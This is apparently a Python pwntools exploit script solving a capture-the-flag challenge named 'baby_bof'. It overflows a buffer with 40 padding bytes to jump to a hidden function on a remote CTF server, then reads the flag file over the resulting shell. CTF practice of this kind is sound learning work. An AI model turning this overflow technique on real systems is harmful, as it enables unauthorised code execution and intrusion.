from pwn import *

elf = ELF('./baby_bof')
addr = elf.symbols['you_cant_see_this_its_too_evil']

local = False
if local:
    r = process("./baby_bof")
else:
    r = remote("ctf.adl.csie.ncu.edu.tw", 11001)

print hex(addr)
payload = "a" * 40 + p64(addr)

r.sendline(payload)
r.sendline('cat /home/baby_bof/flag')
r.interactive()
